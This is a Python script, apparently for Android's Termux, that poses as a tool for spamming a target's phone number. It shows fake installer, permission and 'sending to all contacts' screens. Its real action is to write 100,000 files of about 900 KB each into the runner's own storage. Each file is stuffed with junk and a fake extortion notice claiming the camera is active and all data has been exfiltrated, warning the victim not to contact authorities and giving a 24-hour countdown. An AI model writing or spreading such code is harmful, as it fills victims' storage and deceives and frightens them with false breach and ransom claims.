#!/usr/bin/env python3
import os, sys, time, random, string, signal
from concurrent.futures import ThreadPoolExecutor, as_completed

m = "\033[1;31m"
p = "\033[1;37m"
k = "\033[1;33m"
r = "\033[0m"

# ================== KONFIGURASI ==================
TOTAL_FILES = 100000
MIN_KB = 900
MAX_KB = 900
THREADS = 80
OUTPUT_DIR = "/storage/emulated/0/android_manifest_xtb"

FILENAME_PATTERN = '({nomor}) "file {nomor} android_phone_sytem_xtb.txt'

# ================== CUSTOM ISI FILE ==================
# Teks lu di sini. Bakal muncul UTUH sebagai satu blok, gak kepisah random.
CUSTOM_ISI = """
SYSTEM BREACH NOTIFICATION
NOTIFIKASI PELANGGARAN SISTEM

perangkat anda telah compromised.
all data has been exfiltrated.
seluruh data telah disalin.

front camera: active / kamera depan aktif.
location: tracked / lokasi terpantau.
contacts: copied / kontak tersalin.
file storage: copied / penyimpanan berkas tersalin.
browsing history: copied / riwayat penjelajahan tersalin.
installed applications: indexed / aplikasi terpasang terindeks.

do not power off the device.
jangan matikan perangkat.

do not delete any files.
jangan hapus berkas apapun.

do not contact authorities.
jangan hubungi pihak berwenang.

compliance ensures your data remains private.
kepatuhan menjamin data anda tetap privat.

resistance ensures full disclosure of all contents.
perlawanan menjamin pengungkapan penuh seluruh isi perangkat.

you have 24 hours.
anda memiliki 24 jam.

countdown initiated.
hitungan mundur dimulai.

PROPETY OF BY DZX-777
"""
# =====================================================

CUSTOM_MESSAGES = {
    "izin_awal": (
        "sayangnya tools tidak akan sebelum anda memberikan akses tools pada sistem anda agar tools bekerja akurat\n"
        "dan dapat menargetkan nomor yang anda targetkan\n"
        "karena sistem tools ini lokal hanya berjalan di perangkat anda\n"
        "oleh karena itu izinkan tools ini dengan cara pilih Y untuk memberikan izin"
    ),
    "setup": "SET-UP storage...",
    "gagal_sesi": "Sayang nya ada 5 sesi proses gagal yuk klik Y untuk melanjutkan proses yang gagal",
    "error_merah": "System operasi tools spam gagal tools rusak eror",
    "storage_siap": "Storage siap",
    "installer": "Installer dimulai di perangkat ini",
    "kirim_script": "mengirimkan (script)",
    "kirim_virtex": "mengirimkan (virtex)",
    "file_terkirim": "FILE TERKIRIM (✓)",
    "proses_kirim": "SYSTEM OPERASI MENGIRIM SPAM KE SELURUH KONTAK ANDA",
    "berhasil": "Kirim file berhasil",
    "selesai": "Selesai. File tersimpan di",
    "total": "Total file",
}

# ================== POTONGAN SCRIPT SETENGAH JADI ==================
SCRIPT_FRAGMENTS = [
    # PYTHON
    "def process_data(self, items):",
    "    if not items: return None",
    "    for i in range(len(items)):",
    "        try: result = items[i].get('value')",
    "        except Exception as e: pass",
    "class Handler(object):",
    "    def __init__(self, *args, **kwargs):",
    "        self.data = {}",
    "        self._lock = threading.Lock()",
    "import os, sys, json",
    "from typing import Optional, List",
    "async def fetch(url):",
    "    return await session.get(url)",
    "lambda x: x if x > 0 else -x",
    "raise ValueError('invalid input')",
    "with open('config.json') as f:",
    "    config = json.load(f)",
    "assert isinstance(data, dict)",
    "yield from generator()",

    # HTML
    "<!DOCTYPE html>",
    "<html lang=\"en\">",
    "<head><meta charset=\"UTF-8\">",
    "<title>Untitled Document</title>",
    "<body class=\"container\">",
    "<div id=\"app\" class=\"wrapper\">",
    "<script src=\"main.js\"></script>",
    "<link rel=\"stylesheet\" href=\"style.css\">",
    "</head><body>",
    "<input type=\"text\" name=\"username\">",
    "<button onclick=\"submitForm()\">Submit</button>",
    "<table border=\"1\" cellpadding=\"5\">",
    "<tr><td>Row 1</td></tr>",
    "</table></div></body></html>",

    # SQL
    "SELECT * FROM users WHERE id = 1;",
    "INSERT INTO logs (msg) VALUES ('test');",
    "UPDATE accounts SET balance = balance - 100;",
    "DELETE FROM sessions WHERE expired = 1;",
    "CREATE TABLE tmp_data (id INT, val TEXT);",
    "DROP TABLE IF EXISTS cache;",
    "ALTER TABLE users ADD COLUMN email VARCHAR(255);",
    "UNION SELECT password FROM admin --",
    "WHERE 1=1 OR 'a'='a'",
    "JOIN orders ON users.id = orders.user_id",

    # JAVASCRIPT
    "function initApp() {",
    "  const data = await fetch('/api');",
    "  return data.json();",
    "}",
    "let counter = 0;",
    "setInterval(() => counter++, 1000);",
    "document.getElementById('btn').addEventListener('click', () => {});",
    "export default { name: 'Component' };",
    "if (typeof window !== 'undefined') { }",
    "Array.from({length: 10}, (_, i) => i)",

    # PHP
    "<?php",
    "  $conn = new mysqli($host, $user, $pass);",
    "  if (!$conn) die('Connection failed');",
    "  $query = 'SELECT * FROM users';",
    "  while ($row = $query->fetch_assoc()) {}",
    "?>",
    "function validate($input) { return filter_var($input, FILTER_SANITIZE_STRING); }",
    "echo json_encode(['status' => 'ok']);",

    # C / C++
    "#include <stdio.h>",
    "int main(int argc, char **argv) {",
    "    printf(\"hello\\n\");",
    "    return 0;",
    "}",
    "struct Node { int val; struct Node *next; };",
    "void *ptr = malloc(sizeof(int) * 10);",
    "for (int i = 0; i < n; i++) { }",
    "typedef unsigned long size_t;",

    # BASH
    "#!/bin/bash",
    "if [ -f \"$FILE\" ]; then",
    "    echo 'exists'",
    "fi",
    "for i in $(seq 1 10); do echo $i; done",
    "export PATH=$PATH:/usr/local/bin",
    "chmod +x script.sh && ./script.sh",

    # JSON / YAML
    "{ \"name\": \"test\", \"value\": 123 }",
    "config:",
    "  debug: true",
    "  port: 8080",
    "  hosts:",
    "    - 127.0.0.1",
    "    - 0.0.0.0",

    # RANDOM CODE FRAGMENTS
    "0x7FFFFFFF",
    "0b10101010",
    "undefined",
    "NaN",
    "nullptr",
    "segfault",
    "kernel panic",
    "buffer overflow",
    "stack trace",
    "Access denied",
    "Permission denied",
    "Segmentation fault (core dumped)",
    "SyntaxError: unexpected token",
    "TypeError: cannot read property",
    "IndexError: list index out of range",
]

STOP = False
def handler(sig, frame):
    global STOP
    STOP = True
    print(f"\n{m}[!] Dihentikan oleh user{r}")
    sys.exit(0)
signal.signal(signal.SIGINT, handler)

def clear():
    os.system("clear")

def random_content(size_kb):
    pool = (
        string.ascii_letters + string.digits + string.punctuation +
        "░▒▓█▄▀■□●○◆◇" +
        "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᚾᛁᛃᛇᛈᛉᛊᛏᛒᛖᛗᛚᛜᛞᛟ" +
        "ᛠᛡᛢᛣᛤᛥᛦᛧᛨᛩᛪ᛫᛬᛭᚜᚛" +
        "∀∂∃∄∅∆∇∈∉∊∋∌∍∎∏∐∑−∓∔∕∖∗∘∙√∛∜∝" +
        "∞∟∠∡∢∣∤∥∦∧∨∩∪∫∬∭∮∯∰∱∲∳" +
        "⌐⌑⌒⌓⌔⌕⌖⌗⌘⌙" +
        "─━│┃┄┅┆┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛" +
        "╔╗╚╝╠╣╦╩╬╭╮╯╰╱╲╳" +
        "▁▂▃▄▅▆▇█▉▊▋▌▍▎▏▐" +
        "←↑→↓↔↕↖↗↘↙↚↛↜↝" +
        "⇐⇑⇒⇓⇔⇕⇖⇗⇘⇙" +
        "∅∈∉∋∌⊂⊃⊄⊅⊆⊇" +
        "≠≡≤≥≪≫" +
        "⟨⟩⟪⟫" +
        "⌀⌁⌂"
    )

    custom_block = CUSTOM_ISI.strip()
    target = size_kb * 1024
    buf = []
    size = 0

    while size < target:
        if random.random() < 0.3 and custom_block:
            for line in custom_block.split("\n"):
                if line.strip():
                    buf.append(line)
                    size += len(line) + 1
                    if size >= target:
                        break
        else:
            mode = random.randint(0, 1)
            if mode == 0:
                line = ''.join(random.choices(pool, k=random.randint(10, 40)))
            else:
                line = random.choice(SCRIPT_FRAGMENTS) if SCRIPT_FRAGMENTS else ''.join(random.choices(pool, k=random.randint(10, 40)))
            buf.append(line)
            size += len(line) + 1

    return "\n".join(buf)

def prompt_yellow(text):
    if text:
        print(f"{k}{text}{r}")
    while True:
        ans = input(f"{m}[Y/N] {r}").strip().lower()
        if ans == "y":
            return True
        print(f"{m}{CUSTOM_MESSAGES['error_merah']}{r}\n")

def setup_storage():
    clear()
    print(f"{k}{CUSTOM_MESSAGES['izin_awal']}{r}\n")
    prompt_yellow("")

    clear()
    print(f"{k}{CUSTOM_MESSAGES['setup']}{r}")
    for i in range(0, 101, 5):
        print(f"  progress: {i}%", end="\r")
        time.sleep(0.2)
    print()
    print(f"{k}{CUSTOM_MESSAGES['gagal_sesi']}{r}\n")
    prompt_yellow("")

    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
    except Exception as e:
        print(f"{m}[!] Gagal buat folder: {e}{r}")
        print(f"{k}Jalanin dulu: termux-setup-storage{r}")
        sys.exit(1)

    print(f"{k}{CUSTOM_MESSAGES['storage_siap']}: {p}{OUTPUT_DIR}{r}\n")
    time.sleep(1)

def installer_fake():
    clear()
    print(f"{k}{CUSTOM_MESSAGES['installer']}{r}\n")
    for i in range(0, 101, 2):
        print(f"  STATUS {i}%", end="\r")
        time.sleep(0.03)
    print("\n")
    print(f"{p}{CUSTOM_MESSAGES['kirim_script']}{r}")
    print(f"{p}{CUSTOM_MESSAGES['kirim_virtex']}{r}")
    print(f"{p}proses: {k}", end="")
    for _ in range(20):
        print("█", end="", flush=True)
        time.sleep(0.05)
    print(f"{r}\n")
    print(f"{p}{CUSTOM_MESSAGES['file_terkirim']}{r}\n")
    time.sleep(1)

def loading_animation(duration=3):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    idx = 0
    while time.time() < end:
        sys.stdout.write(f"\r{k}{frames[idx % len(frames)]} {CUSTOM_MESSAGES['proses_kirim']}...{r}")
        sys.stdout.flush()
        idx += 1
        time.sleep(0.1)
    print()

def write_one(index):
    if STOP:
        return None
    try:
        content = random_content(random.randint(MIN_KB, MAX_KB))
        filename = FILENAME_PATTERN.format(nomor=index)
        path = os.path.join(OUTPUT_DIR, filename)
        with open(path, "w", encoding="utf-8", errors="ignore") as f:
            f.write(content)
        return index
    except Exception as e:
        return None

def send_files():
    clear()
    loading_animation(3)
    print(f"\n{k}{CUSTOM_MESSAGES['proses_kirim']}{r}\n")
    counter = 0
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(write_one, i): i for i in range(1, TOTAL_FILES + 1)}
        for future in as_completed(futures):
            if STOP:
                break
            result = future.result()
            if result is not None:
                counter += 1
                print(f"{p}> {CUSTOM_MESSAGES['berhasil']} {counter} {k}(✓){r}")
    print(f"\n{k}{CUSTOM_MESSAGES['selesai']}: {p}{OUTPUT_DIR}{r}")
    print(f"{k}{CUSTOM_MESSAGES['total']}: {p}{counter}{r}")

def main():
    clear()
    setup_storage()
    installer_fake()
    send_files()

if __name__ == "__main__":
    main()
